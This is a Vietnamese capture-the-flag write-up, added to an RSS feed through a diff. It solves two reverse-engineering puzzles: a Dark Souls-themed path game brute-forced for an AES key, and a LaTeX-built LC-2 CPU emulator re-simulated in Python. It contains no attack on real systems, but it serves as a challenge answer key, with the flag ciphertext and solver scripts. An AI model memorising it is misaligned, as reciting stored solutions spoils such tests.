+
+def main():
+    global position
+    print(f&#34;\n{ITALIC}You slowly rise as you are awaken by a sweet and ageless voice. \n&#39;Let the Flame guide thee in this search for the flag&#39;, she whispers softly into your ear. \nBefore you can ask any questions, she disappears. \n\nYou are now left in utter silence.{END}\n&#34;)
+    print(f&#34;\t{UNDERLINE}PRESS ENTER TO CONTINUE{END}&#34;)
+    input()
+    position = &#34;Cemetery of Ash&#34;
+    path.append(position)  
+    play()
+
+
+if __name__ == &#34;__main__&#34;:
+    main()
+    
+</code></pre><p>Khi đạt điều kiện kết thúc của path ( đến vị trí Kiln of the First Flame hoặc độ dài path lớn hơn 22) thì chương trình sẽ gọi check flag. Ở đây chương trình sinh string bằng 1 thuật toán xử lý từ list path, sau đó đưa kết quả thu được mã hóa bằng hàm băm sha256, rồi lấy nó làm key để giải mã Flag. Hàm băm sha256 là không thể đảo ngược ( hoặc có thể theo một vài pháp sư Trung hoa tuyên bố :v ) do vậy phương án mình nghĩ ra là brute force, do số đường đi vẫn đủ nhỏ chấp nhận được.</p>
+<h3 id="2-analyzing-constraints">2. Analyzing constraints</h3>
+<p>Các ràng buộc đối với path để path hợp lệ nằm bên trong hàm proceed, được obfuscated để khó nhận ra hơn.</p>
+<pre tabindex="0"><code>if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
+    if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
+            die(1)
+elif sum(int(d) for d in str(abs(routes[places.index(position)][0]))) % 3 == 0:   
+    if next &gt; (int(bool(len(&#34;Why, Patches, why?&#34;)))):
+            die(1)
+elif str(abs(routes[places.index(position)][0]))[-1] in &#34;05&#34;:  
+    if next &gt; (True &lt;&lt; True):
+            die(1)
+elif (sum(int(str(routes[places.index(position)][0])[i]) for i in range(0, len(str(routes[places.index(position)][0])), 2)) - sum(int(str(routes[places.index(position)][0])[i]) for i in range(1, len(str(routes[places.index(position)][0])), 2))) % 11 == 0: 
+    if next &gt; (sum(map(int,str(111111)[::2]))):
+            die(1)
+</code></pre><p>Đi vào phân tích từng ràng buộc một, mình sẽ viết lại các ràng buộc để dễ nhìn hơn. Mình sẽ đặt key = routes[places.index(position)][0].</p>
+<pre tabindex="0"><code>if sum([0, 0, 0, 1][routes[places.index(position)][0]:routes[places.index(position)][0]+1]) == 1:
+        if next &gt; ((221^216)&gt;&gt;True)*((len(&#34;...Rise, if you would...for that is our curse...&#34;)^53)&gt;&gt;1):
+            die(1)
+</code></pre><p>Ở ràng buộc đầu tiên, nó sẽ tương đương với:</p>
+<pre tabindex="0"><code>if key == 3:
+        Max_choice=4
+</code></pre><p>Điều đó có nghĩa là người chơi sẽ được chọn bước tiếp theo là [0,1,2,3]. Tương tự với 3 ràng buộc còn lại.</p>
+<pre tabindex="0"><code>elif sum(int(d) for d in str(abs(key))) % 3 == 0:
+        Max_choice=1
+        
+elif str(abs(key))[-1] in &#34;05&#34;:
+        Max_choice=2
+elif:
+        even_sum = sum(int(d) for d in str(abs(key))[::2])
+        odd_sum = sum(int(d) for d in str(abs(key))[1::2])
+        if (even_sum - odd_sum) % 11 == 0:
+            Max_choce=3
+
+Max_choice =0
+</code></pre><h3 id="3-brute-force">3. Brute force</h3>
+<pre tabindex="0"><code>import hashlib
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import os
+import base64
+import random
+from collections import deque
+FLAG = &#34;JlLScp2qTzfFZ7kIYP6Jm5Mv/2h6p26S0OWgmXYdEMAl1Sjg6hwW95bPsZdtiggvHVVv8zM+x7vRw2qOr3ORbw==&#34;
+RED = &#34;\033[0;31m&#34;
+PURPLE = &#34;\033[0;35m&#34;
+ITALIC = &#34;\033[3m&#34;
+BOLD = &#34;\033[1m&#34;
+UNDERLINE = &#34;\033[4m&#34;
+END = &#34;\033[0m&#34;
+
+
+class Cipher:
+    def encrypt(self, plainText, key):
+        iv = os.urandom(16) 
+        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest() 
+        cipher = AES.new(privateKey, AES.MODE_CBC, iv)
+        encryptedBytes = cipher.encrypt(pad(plainText.encode(), AES.block_size))  
+        return base64.b64encode(iv + encryptedBytes).decode()
+
+    def decrypt(self, encrypted, key):
+        encryptedData = base64.b64decode(encrypted) 
+        iv = encryptedData[:16] 
+        privateKey = hashlib.sha256(key.encode(&#34;utf-8&#34;)).digest()  
+        cipher = AES.new(privateKey, AES.MODE_CBC, iv) 
+        try:
+            decryptedBytes = unpad(cipher.decrypt(encryptedData[16:]), AES.block_size)  
+        except:
+            return &#39;&#39;
+        return decryptedBytes.decode()
+
+
+places = [&#34;Cemetery of Ash&#34;, &#34;Grand Archives&#34;, &#34;Profaned Capital&#34;, &#34;Farron Keep&#34;, &#34;Anor Londo&#34;, &#34;High Wall of Lothric&#34;, &#34;Undead Settlement&#34;, &#34;Firelink Shrine&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Lothric Castle&#34;, &#34;Cathedral of the Deep&#34;,&#34;Irithyll of the Boreal Valley&#34;,&#34;Untended Graves&#34;,&#34;Kiln of the First Flame&#34;]
+
+routes = [
+    [60, &#34;Firelink Shrine&#34;, &#34;Kiln of the First Flame&#34;, &#34;Undead Settlement&#34;, &#34;High Wall of Lothric&#34;],
+    [-10, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Untended Graves&#34;],
+    [12, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;, &#34;Undead Settlement&#34;, &#34;Kiln of the First Flame&#34;],
+    [-5555, &#34;Road of Sacrifices&#34;, &#34;Catacombs of Carthus&#34;, &#34;Anor Londo&#34;, &#34;Cathedral of the Deep&#34;],
+    [555, &#34;Irithyll of the Boreal Valley&#34;, &#34;Irithyll Dungeon&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;],
+    [3, &#34;Firelink Shrine&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;, &#34;Untended Graves&#34;],
+    [1015, &#34;High Wall of Lothric&#34;, &#34;Road of Sacrifices&#34;, &#34;Irithyll Dungeon&#34;, &#34;Grand Archives&#34;],
+    [35, &#34;Kiln of the First Flame&#34;, &#34;High Wall of Lothric&#34;, &#34;Cemetery of Ash&#34;, &#34;Irithyll of the Boreal Valley&#34;],
+    [143, &#34;Cathedral of the Deep&#34;, &#34;Farron Keep&#34;, &#34;Undead Settlement&#34;, &#34;Lothric Castle&#34;],
+    [1551, &#34;Irithyll of the Boreal Valley&#34;, &#34;Profaned Capital&#34;, &#34;High Wall of Lothric&#34;, &#34;Farron Keep&#34;],
+    [70, &#34;Farron Keep&#34;, &#34;Irithyll of the Boreal Valley&#34;, &#34;Grand Archives&#34;, &#34;Firelink Shrine&#34;],
+    [77, &#34;High Wall of Lothric&#34;, &#34;Untended Graves&#34;, &#34;Grand Archives&#34;, &#34;Farron Keep&#34;],
+    [718640, &#34;Farron Keep&#34;, &#34;Road of Sacrifices&#34;, &#34;Profaned Capital&#34;, &#34;Anor Londo&#34;],
+    [869, &#34;Anor Londo&#34;, &#34;Irithyll Dungeon&#34;, &#34;Catacombs of Carthus&#34;, &#34;Road of Sacrifices&#34;],
+    [6969, &#34;Lothric Castle&#34;, &#34;High Wall of Lothric&#34;, &#34;Kiln of the First Flame&#34;, &#34;Cathedral of the Deep&#34;]
+]
+path=[]
+check=True
+
+def checkFlag(path):
+    aes = Cipher()
+
+    a = &#34;&#34; 
+    b = &#34;&#34;
+    for p in path:
+        if path.index(p) % 2 == 0:
+            a += f&#34;{p[0]+p[-1]}&#34;
+        else:
+            b += f&#34;{p[0]+p[-1]}&#34;
+
+    key = a + b
+    #print(f&#34;Testing path: {&#39; -&gt; &#39;.join(path)}&#34;) 
+    #print(f&#34;Generated key: {key}&#34;) 
+
+    try:
+        attempt = aes.decrypt(FLAG, key)
+        if attempt and &#34;KSUS&#34; in attempt:
+            print(f&#34;\nYou hear that sweet female voice again, this time clearer.\n{ITALIC}Well done, Unflagged...{END}, she muses as a torn piece of parchment manifests itself in front of you:&#34;)
+            print(f&#34;{PURPLE}{attempt}{END}&#34;)
+            return True  
+    except Exception as e:
+        pass
+    
+    return False  
+
+def die(way):
+    quotes = [
+        f&#34;As you make your next step, you waste a second to glance at the bloodied path you are about to leave behind. \nOne second too long, as a blazing sword piercing right through you suddenly reminds you. \n{ITALIC}This spot marks our grave, but you may rest here too, if you would like...{END} a young prince whispers.&#34;,
+        f&#34;The earth trembles and you feel the sudden urge to look to the greyish sky above you.\n{ITALIC}Ignorant slaves, how quickly you forget{END}, a twisted dragon-man spits as he crushes you under his feet.&#34;,
+        f&#34;The deadly scythe of a woman grabs you by the waist.\n{ITALIC}Return from whence thou cam&#39;st. For that is thy place of belonging{END}, the Sister commands before taking you to your grave.&#34;,
+        f&#34;In the thick mist, a nun-like figure reveals herself in front of you.\n{ITALIC}Return Lord of Londor. You have your own subjects to attain to{END}, she whispers as she cuts right through you with her scythe.&#34;
+    ]
+    if way:
+        print(f&#34;\n{random.choice(quotes)}&#34;)
+    else:
+        print(f&#34;{ITALIC}What is taking you so long?{END}, Patches croons before kicking you off a cliff again.&#34;)
+
+    print(f&#34;\n\t{RED}YOU DIED{END}\n&#34;)
+    global check 
+    check=False
+
+def get_max_choice(key):
+    
+    if key == 3:
+        return 4
+    elif sum(int(d) for d in str(abs(key))) % 3 == 0:
+        return 1
+    elif str(abs(key))[-1] in &#34;05&#34;:
+        return 2
+    else:
+        even_sum = sum(int(d) for d in str(abs(key))[::2])
+        odd_sum = sum(int(d) for d in str(abs(key))[1::2])
+        if (even_sum - odd_sum) % 11 == 0:
+            return 3
+    return 0  
+
+
+def generate_paths(current, path, paths):
+    
+  
+    if current == &#34;Kiln of the First Flame&#34;:
+        paths.append(path)
+        return
+
+    if len(path) &gt;= 22:
+        return
+
+    try:
+        idx = places.index(current)
+    except ValueError:
+        return
+    route = routes[idx]
+    key = route[0]
+    max_choice = get_max_choice(key)
+
+ 
+    for i in range(max_choice):
+        next_place = route[i + 1]
+        generate_paths(next_place, path + [next_place], paths)
+
+
+
+all_paths = []
+generate_paths(&#34;Cemetery of Ash&#34;, [&#34;Cemetery of Ash&#34;], all_paths)
+for path in all_paths:
+    if checkFlag(path)==True:
+        exit()
+</code></pre><p>Mình sẽ sinh tất cả các path hợp lệ dựa vào 4 constraint rồi brute force tìm flag.</p>
+<p></p>
+<h2 id="ii-turing-approved---reverse-engineering">II Turing-Approved - reverse engineering</h2>
+<h3 id="1-static-analysis">1. Static Analysis</h3>
+<p>Giải nén Challenge thì gồm có 4 file là execution.sty, interpreted.tex, Makefile và RAM. Đầu tiên mình kiểm tra file Makefile.</p>
+<pre tabindex="0"><code>.PHONY: run
+
+run:
+   echo &#34;&#34; &gt; DUMP
+   pdflatex --shell-escape interpreted.tex &gt; /dev/null
+   tr -d &#39;\n&#39; &lt; DUMP
+   rm interpreted.aux interpreted.log interpreted.output
+</code></pre><p>Khá kỳ lạ ở đây là pdflatex lại khởi chạy với option &ndash;shell-escape, dùng để thực thi các lệnh shell trong file latex.
+Mình sẽ kiểm tra bên trong file latex, tức file interpreted.tex xem nó thực thi cái gì.</p>
+<pre tabindex="0"><code>\documentclass{article}
+\usepackage[a0paper,landscape]{geometry}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%																%
+%		Hi, enjoy the folly		~ S-Mancl						%
+%																%
+%																%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\usepackage{execution}
+\begin{document}
+
+\pagenumbering{gobble}
+
+\begin{titlepage}
+    \pagestyle{empty}
+	\begin{center}
+		\scalebox{8}{
+		{\LARGE Emulation of a CPU using \LaTeX}
+		}
+		
+		\scalebox{8}{
+		{\Large It&#39;s funny, isn&#39;t it?}
+		}
+	\end{center}
+\end{titlepage}
+
+\setup
+\fetchdecodeexecwriteback
+\printCPU
+
+\end{document}
+</code></pre><p>Ở đây thì mình nhìn thấy title của file pdf được xuất ra là &ldquo;Emulation of a CPU using \LaTeX&rdquo;, làm mình suy nghĩ đến ý tưởng có thể các câu lệnh được thực thi ở đây là một chương trình mô phỏng CPU.</p>
+<p>Sau khi đặt xong title, chương trình chạy 3 lệnh là <code>\setup</code>, <code>\fetchdecodeexecwriteback</code>, và <code>printCPU</code>. Ở bên dưới không có định nghĩa các lệnh này nên có lẽ nó được định nghĩa trong 1 file khác.  Sau một thời gian research thì mình biết rằng file <code>.sty</code> là file có thể dùng để định nghĩa lệnh trong latex, vì vậy mình sẽ đọc file <code>execution.sty</code> xem nó định nghĩa 3 lệnh này như thế nào.
+Mình mở file này ra thì thực sự nó rất &hellip; dài, mình không thể đọc toàn bộ nên chỉ search các từ khóa <code>\setup</code>, <code>\fetchdecodeexecwriteback</code>, và <code>\printCPU</code> xem các lệnh này làm gì,</p>
+<p><code>\setup</code> :</p>
+<pre tabindex="0"><code>\newcommand{\setup}{%
+    \newwrite\myoutput
+    \immediate\openout\myoutput=\jobname.output
+    \lgl{Setting up everything, please be patient}
+
+        \newcounter{lineNumber}
+        \newcounter{countLetters}
+    \setcounter{countLetters}{0}
+        \newcounter{exit}
+        \newcounter{start}
+    \newcounter{end}
+    \newcounter{temp}
+    \newcounter{temp1}
+    \newcounter{temp2}
+    \newcounter{temp3}
+    \newcounter{temp4}
+    \newcounter{temp_}
+    \newcounter{temp_1}
+    \newcounter{temp_2}
+    \foreach \i in {0,...,15}{
+        \newcounter{tempregister_\i}
+        \setcounter{tempregister_\i}{0}
+    }
+    \foreach \i in {0,...,15}{
+        \newcounter{tempregister1_\i}
+        \setcounter{tempregister1_\i}{0}
+    }
+        \newcounter{PC}%
+        \foreach \j in {0,...,511}{
+        \foreach \i in {0,...,15}{
+            \newcounter{mem\j_\i}
+            \setcounter{mem\j_\i}{0}
+        }
+    }
+        \foreach \i in {0,...,7}{
+        \foreach \j in {0,...,15}{
+            \newcounter{R\i\j}
+            \setcounter{R\i\j}{0}
+        }
+    }
+    \foreach \i in {IR,MAR,MDR,PC}{
+        \foreach \j in {0,...,15}{
+            \newcounter{\i\j}
+            \setcounter{\i\j}{0}
+        }
+    }
+    \foreach \i in {0,...,2}{
+        \newcounter{CC\i}
+        \setcounter{CC\i}{0}
+    }
+    
+    \setcounter{CC1}{1}
+    
+    \lr
+}
+
+\newcommand{\lr}{%
+    \setcounter{temp}{0}
+    \setcounter{temp1}{0}
+    \CatchFileDef{\ramdata}{RAM}{}
+    \lgl{Ready to read memory}
+    \foreach \bit in \ramdata {
+        \ifnum\value{temp1}&gt;15
+            \stepcounter{temp}
+            \setcounter{temp1}{0}
+        \fi
+        \ifnum \bit=1
+            \setcounter{mem\arabic{temp}_\arabic{temp1}}{1}
+        \fi
+        \stepcounter{temp1}
+    }
+    \lgl{RAM loaded into emulated memory}
+}
+</code></pre><p><code>\fetchdecodeexecwriteback</code> :</p>
+<pre tabindex="0"><code>\newcommand{\fetchdecodeexecwriteback}{%
+        \setcounter{exit}{0}
+    \loop
+    \ti{PC}%
+        \printCPU%
+%
+%
+    \foreach \i in {0,...,15}{%
+        \setcounter{IR\i}{\value{mem\arabic{PC}_\i}}%
+    }%
+    \immediate\write18{printf &#34;\\a&#34; 1&gt;&amp;2;}
+%
+    \ifnum \value{IR0}=0{
+        \ifnum \value{IR1}=0{
+            \ifnum \value{IR2}=0{
+                \ifnum \value{IR3}=0{
+                    \nxti
+                    \lits{BR}
+                    \pb
+                }\else{
+                    \lits{ADD}
+                    \pa
+                    \nxti
+                }\fi
+            }\else{
+                \ifnum \value{IR3}=0{
+                    \lits{LD}
+                    \pl
+                    \nxti
+                }\else{
+                    \lits{ST}
+                    \ps
+                    \nxti
+                }\fi
+            }\fi
+        }\else{
+            \ifnum \value{IR2}=0{
+                \ifnum \value{IR3}=0{
+                    \lits{JSR}
+                    \pjts
+                }\else{
+                    \lits{AND}
+                    \pan
+                    \nxti
+                }\fi
+            }\else{
+                \ifnum \value{IR3}=0{
+                    \lits{LDR}
+                    \plr
+                    \nxti
+                }\else{
+                    \lits{STR}
+                    \psr
+                    \nxti
+                }\fi
+            }\fi
+        }\fi
+    }\else{
+        \ifnum \value{IR1}=0{
+            \ifnum \value{IR2}=0{
+                \ifnum \value{IR3}=0{
+                    \lits{RTI}
+                    \prfi
+                }\else{
+                    \lits{NOT}
+                    \pn
+                    \nxti
+                }\fi
+            }\else{
+                \ifnum \value{IR3}=0{
+                    \lits{LDI}
+                    \pli
+                    \nxti
+                }\else{
+                    \lits{STI}
+                    \psit
+                    \nxti
+                }\fi
+            }\fi
+        }\else{
+            \ifnum \value{IR2}=0{
+                \ifnum \value{IR3}=0{
+                    \lits{JSSR}
+                    \pjtsur
+                }\else{
+                    \lits{RET}
+                    \pr
+                    \nxti
+                }\fi
+            }\else{
+                \ifnum \value{IR3}=0{
+                    \lits{LEA}
+                    \plea
+                    \nxti
+                }\else{
+                    \lits{TRAP}
+                    \pt
+                }\fi
+            }\fi
+        }\fi
+    }\fi
+
+        
+    \ifnum \value{exit}=0
+    \repeat
+
+    \lgl{Execution has ended}
+    \setcounter{temp}{0}
+    \setcounter{temp1}{0}
+    \lgl{Ready to dump memory}
+    
+
+    \foreach \j in {0,...,511}{
+        \foreach \i in {0,...,15}{
+            \ifnum \value{mem\j_\i}=1%
+                \immediate\write18{echo 1 &gt;&gt; DUMP}
+            \else
+                \immediate\write18{echo 0 &gt;&gt; DUMP}
+            \fi
+        }
+    }
+    \lgl{RAM DUMPED SUCCESSFULLY}
+    \immediate\closeout\myoutput
+}%
+</code></pre><p><code>\printCPU</code> :</p>
+<pre tabindex="0"><code>\newcommand{\printCPU}{
+    \td{R0}
+    \prr{R0}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R1}
+    \prr{R1}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R2}
+    \prr{R2}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R3}
+    \prr{R3}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R4}
+    \prr{R4}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R5}
+    \prr{R5}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R6}
+    \prr{R6}{\arabic{temp}}{0x\hexa{temp}}
+    \td{R7}
+    \prr{R7}{\arabic{temp}}{0x\hexa{temp}}
+    \tdu{PC}
+    \prr{PC}{\arabic{temp}}{0x\hexa{temp}}
+    \tdu{IR}
+    \prr{IR}{\arabic{temp}}{0x\hexa{temp}}
+    \ifnum \value{CC0}=1%
+    \prr{CC}{(N)}{0x4}%
+    \else{%
+    \ifnum \value{CC1}=1%
+    \prr{CC}{(Z)}{0x2}%
+    \else%
+    \prr{CC}{(P)}{0x1}%
+    \fi%
+    }%
+    \fi%
+}
+</code></pre><p>Lệnh <code>\setup</code> tạo ra nhiều bộ đếm khác nhau, sau đó điền một số bộ đếm bằng <code>\lr</code>. Trong mô tả của lệnh này thì nó ghi <code>RAM loaded into emulated memory</code>. Load file RAM vào bộ nhớ giả lập ?</p>
+<p>Lệnh <code>\fetchdecodeexecwriteback</code> load các số nhị phân vào các &lsquo;IR&rsquo; từ &lsquo;bộ nhớ&rsquo;. Nếu như giả lập CPU như nó mô tả thì IR liệu có phải &lsquo;Instruction Register&rsquo; ? Tiếp đó lệnh này kiểm tra từng giá trị bit xác định các Opcode ( mình đoán dựa vào các giá trị ADD, LDI, RET,&hellip; Cộng với việc nó mô tả nó là CPU giả lập, đây có vẻ như là các câu lệnh trong Kiến trúc tập lệnh (ISA) của CPU được giả lập).</p>
+<p>Lệnh <code>\printCPU</code> in các thông tin của các thanh ghi.</p>
+<p>Oke vậy là chúng ta đã phân tích cơ bản về mã nguồn, mình sẽ thử chạy nó xem sao.</p>
+<h3 id="2-dynamic-analysis">2. Dynamic Analysis</h3>
+<p>Dùng lệnh <code>make run</code> để chạy các lệnh bên trong Makefile.</p>
+<p></p>
+<p></p>
+<p>Tóm gọn lại output như sau</p>
+<pre tabindex="0"><code>echo &#34;&#34; &gt; DUMP
+pdflatex --shell-escape interpreted.tex &gt; /dev/null
+
+LC-2&gt;   Setting up everything, please be patient...
+
+LC-2&gt;   Ready to read memory...
+
+LC-2&gt;   RAM loaded into emulated memory...
+[ Các bảng mô tả dữ liệu trong Register ]
+LC-2&gt;   Found a TRAP...
+
+LC-2&gt;   Execution has ended...
+
+LC-2&gt;   Ready to dump memory...
+
+LC-2&gt;   RAM DUMPED SUCCESSFULLY...
+
+.-------.-------.-------.
+|R0     |3772   |0xEBC  |
+.-------.-------.-------.
+|R1     |3      |0x3    |
+.-------.-------.-------.
+|R2     |3769   |0xEB9  |
+.-------.-------.-------.
+|R3     |0      |0x0    |
+.-------.-------.-------.
+|R4     |0      |0x0    |
+.-------.-------.-------.
+|R5     |0      |0x0    |
+.-------.-------.-------.
+|R6     |0      |0x0    |
+.-------.-------.-------.
+|R7     |0      |0x0    |
+.-------.-------.-------.
+|PC     |278    |0x116  |
+.-------.-------.-------.
+|IR     |61477  |0xF025 |
+.-------.-------.-------.
+|CC     |(P)    |0x1    |
+tr -d &#39;\n&#39; &lt; DUMP
+[ Một dãy các giá trị nhị phân mà với dòng &#39;RAM DUMPED SUCCESSFULLY&#39;, có thể đoán là RAM sau khi thực thi]
+</code></pre><p>Shell của CPU giả lập ghi là LC-2, Mình quyết định research xem LC-2 là gì để hiểu kiến trúc tập lệnh của nó. Đây là kiến trúc của 1 máy tính giả lập Little Computer 2. Có thể tham khảo reference của nó tại đây: <a href="https://www.cs.utexas.edu/~fussell/courses/cs310h/simulator/lc2.pdf" target="_blank" rel="noopener noreffer ">https://www.cs.utexas.edu/~fussell/courses/cs310h/simulator/lc2.pdf</a></p>
+<p>Dựa theo tài liệu này mình viết 1 script để dịch các Opcode dễ đọc hơn.</p>
+<pre tabindex="0"><code>with open(&#34;RAM&#34;) as f:
+    RAM = f.read()
+f.close()
+RAM = [&#39;&#39;.join(RAM.split(&#34;,&#34;))[16*i:16*(i+1)] for i in range(len(RAM.split(&#34;,&#34;))//16)][1:]
+map = {
+    &#34;0001&#34;: &#34;ADD  &#34;,
+    &#34;0101&#34;: &#34;AND  &#34;,
+    &#34;0000&#34;: &#34;BR   &#34;,
+    &#34;0100&#34;: &#34;JSR  &#34;,
+    &#34;1100&#34;: &#34;JSRR &#34;,
+    &#34;0010&#34;: &#34;LD   &#34;,
+    &#34;1010&#34;: &#34;LDI  &#34;,
+    &#34;0110&#34;: &#34;LDR  &#34;,
+    &#34;1110&#34;: &#34;LEA  &#34;,
+    &#34;1001&#34;: &#34;NOT  &#34;,
+    &#34;1101&#34;: &#34;RET  &#34;,
+    &#34;1000&#34;: &#34;RTI  &#34;,
+    &#34;0011&#34;: &#34;ST   &#34;,
+    &#34;1011&#34;: &#34;STI  &#34;,
+    &#34;0111&#34;: &#34;STR  &#34;,
+    &#34;1111&#34;: &#34;TRAP &#34;
+}
+
+RAM = &#39;\n&#39;.join([map[i[0:4]]+i[4:] for i in RAM])
+
+print(RAM)
+</code></pre><p></p>
+<p>Nhìn thì có vẻ dài nhưng mình thấy đây là một chuỗi các khối lệnh lặp lại.</p>
+<pre tabindex="0"><code>LD R2, ??
+LD R1, ??
+ADD R0, R1, R2
+ST R0, ??
+Trap x25
+BR ?
+.....
+</code></pre><p>Phần còn lại có vẻ không có ý nghĩa, vì thế mình tập trung vào các khối lệnh này. Ở đây lệnh <code>Trap x25</code> sẽ làm chương trình dừng thực thi ở mỗi khối lệnh, do vậy để mô phỏng lại chính xác chương trình làm gì mình sẽ patch sạch các câu lệnh này về nope.</p>
+<p>Như vậy ý tưởng sẽ là patch tất cả các câu lệnh <code>Trap x25</code> bằng nop và bỏ qua các lệnh còn lại, thử interpret các giá trị từ RAM rồi chạy xem. Kết quả thì mình thu được flag.</p>
+<p></p>
+<h3 id="3-script">3. Script</h3>
+<pre tabindex="0"><code>state = {
+    &#34;PC&#34;: 0,
+    &#34;registers&#34;: [0,0,0,0,0,0,0,0],
+    &#34;RAM&#34; : None
+}
+
+def RAMload():
+    global state
+    with open(&#34;RAM&#34;) as f:
+        state[&#34;RAM&#34;] = f.read()
+    f.close()
+    state[&#34;RAM&#34;] = [&#39;&#39;.join(state[&#34;RAM&#34;].split(&#34;,&#34;))[16*i:16*(i+1)] for i in range(len(state[&#34;RAM&#34;].split(&#34;,&#34;))//16)][1:]
+
+def simulate():
+    global state
+    map = {
+        &#34;0001&#34;: add,
+        &#34;0101&#34;: nope,
+        &#34;0000&#34;: jump,
+        &#34;0100&#34;: nope,
+        &#34;1100&#34;: nope,
+        &#34;0010&#34;: load,
+        &#34;1010&#34;: nope,
+        &#34;0110&#34;: nope,
+        &#34;1110&#34;: nope,
+        &#34;1001&#34;: nope,
+        &#34;1101&#34;: nope,
+        &#34;1000&#34;: nope,
+        &#34;0011&#34;: store,
+        &#34;1011&#34;: nope,
+        &#34;0111&#34;: nope,
+        &#34;1111&#34;: trap
+    }
+    while state[&#34;PC&#34;] != len(state[&#34;RAM&#34;]):
+        curr_instruction = state[&#34;RAM&#34;][state[&#34;PC&#34;]]
+        map[curr_instruction[:4]](curr_instruction[4:])
+    print()
+
+def nope(data):
+    pass
+
+def add(data):
+    global state
+    state[&#34;registers&#34;][0] = state[&#34;registers&#34;][1] + state[&#34;registers&#34;][2]
+    print(chr(state[&#34;registers&#34;][0]),end=&#39;&#39;)
+    state[&#34;PC&#34;] += 1
+
+def jump(data):
+    global state
+    addr = int(data[3:],2)
+    if addr:
+        state[&#34;PC&#34;] = addr
+    else:
+        state[&#34;PC&#34;] += 1
+
+def load(data):
+    global state
+    DR = int(data[:3],2)
+    addr = int(data[3:],2)
+    state[&#34;registers&#34;][DR] = int(state[&#34;RAM&#34;][addr],2)
+    state[&#34;PC&#34;] += 1
+
+def store(data):
+    global state
+    state[&#34;PC&#34;] += 1
+
+def trap(data):
+    global state
+    state[&#34;PC&#34;] += 1
+
+def print_state():
+    global state
+    print(&#34;PC: {PC} R0: {R0} R1: {R1} R2: {R2}&#34;.format(PC=state[&#34;PC&#34;],R0=state[&#34;registers&#34;][0],R1=state[&#34;registers&#34;][1],R2=state[&#34;registers&#34;][2]))
+
+if __name__ == &#34;__main__&#34;:
+    RAMload() 
+    simulate() 
+</code></pre>]]></description>
+</item>
+</channel>
 </rss>
